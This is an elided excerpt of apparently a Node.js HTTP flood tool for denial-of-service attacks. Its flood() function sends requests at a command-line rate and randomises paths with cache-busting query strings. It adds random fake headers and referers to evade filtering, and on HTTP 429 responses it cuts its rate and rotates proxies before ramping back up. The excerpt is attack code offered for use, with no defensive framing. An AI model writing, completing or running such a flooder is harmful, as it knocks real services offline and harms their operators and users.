...
let rps = parseInt(process.argv[6]);
...
async function flood() {
    ...
    if (parsed.path.includes('%rand%')) {
        ...
        setInterval(() => {
            path = parsed.path + "?cache_bust=" + Date.now() + "&rand=" + generateRandomString(5, 10);
        }, 1000);
    }

    let chead = { "cookie": cookie };
    let header = {
        ...
        ...(Math.random() < 0.6 ? { ["rush-combo-javax"]: "zero-" + generateRandomString(1, 5) } : {}),
        ...(Math.random() < 0.6 ? { ["c-xjava" + generateRandomString(1, 2)]: "router-" + generateRandomString(1, 5) } : {}),
    };
    ...
    if (Math.random() >= 0.5) {
        header = {
            ...
            ...(Math.random() < 0.5 ? { "referer": target + "/" + generateRandomString(5, 10) } : {}),
        };
    }
    ...
    const MAX_RATE_LIMITS = 5; // Maximum 429s before forcing a proxy change
    const RPS_REDUCTION_FACTOR = 0.5; // Reduce RPS by 50% on 429
    const RPS_RECOVERY_FACTOR = 1.1; // Increase RPS by 10% if no 429s
    const MIN_RPS = 5;
                            ...
                            case "true":
                                request.on('response', (res) => {
                                    ...
                                    if (ratelimit0 === true && res[":status"] === 429) {
                                        ...
                                        currentRps = Math.max(MIN_RPS, Math.floor(currentRps * RPS_REDUCTION_FACTOR));
                                        ...
                                        currentRps = Math.min(rps, Math.floor(currentRps * RPS_RECOVERY_FACTOR));
                                    }
                                    if (res["set-cookie"]) {
